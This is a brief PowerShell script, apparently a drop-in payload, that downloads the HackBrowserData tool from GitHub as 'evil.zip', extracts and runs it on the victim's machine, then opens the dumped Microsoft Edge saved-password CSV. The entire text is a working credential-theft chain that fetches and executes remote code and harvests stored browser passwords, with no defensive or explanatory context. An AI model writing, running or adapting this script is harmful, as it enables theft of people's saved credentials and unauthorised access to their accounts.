$url = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
$destination = "$env:USERPROFILE\Documents\evil.zip"
Invoke-WebRequest -Uri $url -OutFile $destination
cd $env:USERPROFILE\Documents\evil\results\


#Extract the ZIP file:
$zipPath = "$env:USERPROFILE\Documents\evil.zip"
$extractPath = "$env:USERPROFILE\Documents\evil"
Expand-Archive -Path $zipPath -DestinationPath $extractPath -F

#Run the EXE file:
$exePath = "$env:USERPROFILE\Documents\evil\hack-browser-data.exe"
Start-Process -FilePath $exePath
sleep 3
cd $env:USERPROFILE\Documents\evil\results\results
. notepad microsoft_edge_default_password.csv
exit
